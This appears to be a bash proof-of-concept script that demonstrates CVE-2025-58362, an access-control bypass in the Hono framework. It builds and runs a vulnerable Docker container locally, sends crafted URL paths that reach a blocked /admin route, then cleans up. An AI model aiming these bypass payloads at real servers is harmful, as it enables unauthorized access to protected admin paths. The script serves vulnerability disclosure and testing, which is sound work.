#!/bin/bash

# CVE-2025-58362 PoC Automation Script
# Automatically runs the complete vulnerability demonstration process

set -e

IMAGE_NAME="cve-2025-58362-hono"
CONTAINER_NAME="cve-2025-58362-server"
PORT="3000"
HEALTH_CHECK_RETRIES=5
HEALTH_CHECK_DELAY=2

echo "CVE-2025-58362 PoC Automation"
echo "============================="
echo "This script will:"
echo "1. Build and run vulnerable Hono server"
echo "2. Perform health checks"
echo "3. Test for vulnerability"
echo "4. Clean up resources"
echo ""

# Function to build image
build_image() {
    echo "Step 1: Building Docker image..."
    docker build -t $IMAGE_NAME . > /dev/null 2>&1
    echo "✓ Image built successfully"
}

# Function to run container
run_container() {
    echo "Step 2: Starting vulnerable Hono server..."
    
    # Clean up any existing container
    if docker ps -q -f name=$CONTAINER_NAME | grep -q .; then
        docker stop $CONTAINER_NAME > /dev/null 2>&1
        docker rm $CONTAINER_NAME > /dev/null 2>&1
    fi
    
    # Run new container
    docker run -d \
        --name $CONTAINER_NAME \
        -p $PORT:3000 \
        $IMAGE_NAME > /dev/null 2>&1
    
    echo "✓ Server started on port $PORT"
}

# Function to perform health check
health_check() {
    echo "Step 3: Performing health checks..."
    
    for i in $(seq 1 $HEALTH_CHECK_RETRIES); do
        echo "  Health check attempt $i/$HEALTH_CHECK_RETRIES..."
        
        if curl -s -f http://localhost:$PORT/ > /dev/null 2>&1; then
            echo "✓ Server is healthy and responding"
            return 0
        fi
        
        if [ $i -lt $HEALTH_CHECK_RETRIES ]; then
            echo "  Waiting ${HEALTH_CHECK_DELAY}s before retry..."
            sleep $HEALTH_CHECK_DELAY
        fi
    done
    
    echo "✗ Health check failed after $HEALTH_CHECK_RETRIES attempts"
    return 1
}

# Function to test vulnerability
test_vulnerability() {
    echo "Step 4: Testing for CVE-2025-58362 vulnerability..."
    echo ""
    
    # Test cases
    local tests_passed=0
    local total_tests=0
    
    # Test 1: Normal admin request (should be blocked)
    echo "Test 1: Normal admin request (should be blocked)"
    total_tests=$((total_tests + 1))
    if curl -s -o /dev/null -w "%{http_code}" http://localhost:$PORT/admin | grep -q "403"; then
        echo "  ✓ PASS: Admin request properly blocked (403)"
        tests_passed=$((tests_passed + 1))
    else
        echo "  ✗ FAIL: Admin request not blocked"
    fi
    
    # Test 2: Vulnerable URL with port and @ symbol
    echo "Test 2: Vulnerable URL with port and @ symbol"
    total_tests=$((total_tests + 1))
    local response_code=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:$PORT/https://example.com:8080@evil.com/admin")
    if [ "$response_code" != "403" ]; then
        echo "  ✓ VULNERABILITY DETECTED: Malicious URL bypassed security (HTTP $response_code)"
        tests_passed=$((tests_passed + 1))
    else
        echo "  ✗ FAIL: Malicious URL was blocked (expected vulnerability)"
    fi
    
    # Test 3: Vulnerable URL with authentication info
    echo "Test 3: Vulnerable URL with authentication info"
    total_tests=$((total_tests + 1))
    local response_code=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:$PORT/https://user:pass@example.com/admin")
    if [ "$response_code" != "403" ]; then
        echo "  ✓ VULNERABILITY DETECTED: Auth URL bypassed security (HTTP $response_code)"
        tests_passed=$((tests_passed + 1))
    else
        echo "  ✗ FAIL: Auth URL was blocked (expected vulnerability)"
    fi
    
    # Test 4: Normal public request (should be allowed)
    echo "Test 4: Normal public request (should be allowed)"
    total_tests=$((total_tests + 1))
    if curl -s -o /dev/null -w "%{http_code}" http://localhost:$PORT/public | grep -q "200"; then
        echo "  ✓ PASS: Public request properly allowed (200)"
        tests_passed=$((tests_passed + 1))
    else
        echo "  ✗ FAIL: Public request not allowed"
    fi
    
    echo ""
    echo "Vulnerability Test Results: $tests_passed/$total_tests tests passed"
    
    if [ $tests_passed -gt 2 ]; then
        echo "✓ CVE-2025-58362 VULNERABILITY CONFIRMED!"
        echo "  The vulnerable Hono server allowed unauthorized access to admin paths."
    else
        echo "✗ Vulnerability not detected or server not working properly."
    fi
}

# Function to clean up
clean_up() {
    echo ""
    echo "Step 5: Cleaning up resources..."
    
    # Stop and remove container
    if docker ps -q -f name=$CONTAINER_NAME | grep -q .; then
        docker stop $CONTAINER_NAME > /dev/null 2>&1
        echo "✓ Container stopped"
    fi
    
    if docker ps -aq -f name=$CONTAINER_NAME | grep -q .; then
        docker rm $CONTAINER_NAME > /dev/null 2>&1
        echo "✓ Container removed"
    fi
    
    # Remove image
    if docker images -q $IMAGE_NAME | grep -q .; then
        docker rmi $IMAGE_NAME > /dev/null 2>&1
        echo "✓ Image removed"
    fi
    
    echo "✓ Cleanup completed"
}

# Function to handle errors
handle_error() {
    echo ""
    echo "✗ Error occurred during execution"
    echo "Cleaning up resources..."
    clean_up
    exit 1
}

# Set trap for error handling
trap handle_error ERR

# Main execution
main() {
    build_image
    run_container
    
    if ! health_check; then
        echo "Health check failed. Cleaning up..."
        clean_up
        exit 1
    fi
    
    test_vulnerability
    clean_up
    
    echo ""
    echo "CVE-2025-58362 PoC completed successfully!"
}

# Run main function
main
